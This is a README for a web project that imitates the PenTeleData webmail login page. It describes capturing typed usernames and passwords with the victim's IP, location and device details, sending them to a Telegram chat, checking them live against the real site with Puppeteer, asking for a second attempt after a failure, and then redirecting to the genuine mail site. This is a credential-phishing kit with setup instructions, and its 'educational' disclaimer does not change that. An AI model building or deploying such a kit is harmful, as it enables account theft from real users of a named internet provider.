# PenTeleData Login with Telegram Notifications

This project is a web application that integrates a login page for PenTeleData with a Telegram bot to send notifications about login activity. It captures details such as IP address, geolocation, device information, and login status, then sends them to a specified Telegram chat. The project uses a React frontend, a Node.js backend, and Puppeteer for login validation.

## Features
- **Responsive Login Page**: A user-friendly login interface for PenTeleData, styled with a mountain background and the official PenTeleData logo.
- **Telegram Notifications**: Sends detailed notifications to a Telegram chat for each login attempt, including:
  - Username and password (for demonstration purposes only).
  - IP address, geolocation, and map link.
  - Device, browser, and connection details.
  - Timestamp and login status (success, failure, or error).
- **Login Validation**: Uses Puppeteer to validate credentials against the PenTeleData login page (`https://promail.ptd.net/`).
- **Second Attempt**: Retries login if the first attempt fails, with appropriate notifications.
- **Redirect on Success**: Redirects to `https://promail-legacy.ptd.net/` upon successful login.
- **Dynamic Data**: Fetches IP address via `ipify.org`, geolocation via `ip-api.com`, and device info using `useragent`.

## Project Structure
```
penteledata-login/
├── backend/
│   ├── api.js              # Telegram bot integration and login validation logic
│   ├── server.js           # Express server for handling login requests
│   ├── .env                # Environment variables (Telegram bot token and chat ID)
│   └── package.json        # Backend dependencies
├── src/
│   ├── assets/             # Static assets (if any)
│   ├── components/
│   │   └── LoginPage.jsx   # React component for the login page
│   ├── styles/
│   │   └── LoginPage.css   # CSS for the login page
│   ├── App.jsx             # Main React app component
│   └── index.jsx           # Entry point for React
├── package.json            # Frontend dependencies
└── README.md               # Project documentation
```

## Prerequisites
- **Node.js** (v16 or higher) and npm
- **Telegram Bot**: Create a bot via `@BotFather` on Telegram and obtain the bot token and chat ID.
- A modern web browser for testing the frontend.

## Setup Instructions

### 1. Clone the Repository
```bash
git clone <https://github.com/iMorgann/ptd>
cd penteledata-login
```

### 2. Set Up the Backend
1. Navigate to the backend directory:
   ```bash
   cd backend
   ```
2. Install dependencies:
   ```bash
   npm install
   ```
3. Create a `.env` file in the `backend` directory with the following:
   ```
   BOT_TOKEN=<your-telegram-bot-token>
   CHAT_ID=<your-telegram-chat-id>
   ```
   - Replace `<your-telegram-bot-token>` with your bot token from `@BotFather`.
   - Replace `<your-telegram-chat-id>` with your chat ID (you can get this by messaging `@get_id_bot` on Telegram).
4. Start the backend server:
   ```bash
   node server.js
   ```
   The server will run on `http://localhost:3000`.

### 3. Set Up the Frontend
1. Navigate to the frontend directory:
   ```bash
   cd ..
   ```
2. Install dependencies:
   ```bash
   npm install
   ```
3. Start the frontend development server (using Vite):
   ```bash
   npm run dev
   ```
   The app will be accessible at `http://localhost:5173`.

### 4. Test the Application
1. Open `http://localhost:5173` in your browser.
2. Enter a username and password in the login form and submit.
3. Check your Telegram chat for notifications about the login attempt.
4. If the login is successful, you’ll be redirected to `https://promail-legacy.ptd.net/`.

## Usage
- **Login Page**: Enter your PenTeleData credentials (for testing purposes, use dummy credentials as this is an educational project).
- **Telegram Notifications**: The bot will send a message to the specified chat for each login attempt, including:
  - Success or failure status.
  - Attempt number (first or second attempt).
  - User details (IP, location, device, etc.).
- **Responsive Design**: The login page is optimized for mobile, tablet, and desktop screens.

## Dependencies
- **Backend**:
  - `express`: For the server.
  - `telegraf`: For Telegram bot integration.
  - `puppeteer`: For login validation.
  - `axios`: For API calls (`ipify.org`, `ip-api.com`).
  - `useragent`: For device and browser detection.
  - `dotenv`: For environment variable management.
- **Frontend**:
  - `react`: For building the UI.
  - `vite`: For the development server and build tool.

## Disclaimer
This project is created **solely for educational purposes** to demonstrate the integration of a login page with a Telegram bot for notifications. It is not intended for production use, unauthorized access, or any malicious activity. The project includes functionality that captures and logs sensitive information (e.g., usernames, passwords, IP addresses) for demonstration purposes only. **Do not use this project to harm systems, networks, or individuals.**

By using this project, you agree to the following:
- You will only use this project in a controlled, ethical, and legal environment (e.g., with test accounts and mock data).
- You are responsible for ensuring compliance with all applicable laws, regulations, and terms of service, including those of PenTeleData and Telegram.
- The author(s) of this project are not liable for any misuse, damages, or legal consequences resulting from the use of this code.

**Important Notes**:
- Do not use real credentials with this project, as it logs sensitive data to Telegram for demonstration purposes.
- Ensure you have permission to interact with the PenTeleData login page (`https://promail.ptd.net/`) in this manner.
- Be aware that excessive requests to `ip-api.com` may result in rate limiting (45 requests per minute for free usage).

## License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contributing
Contributions are welcome! Please open an issue or submit a pull request with any improvements or bug fixes.

## Contact
For questions or feedback, please open an issue on the repository.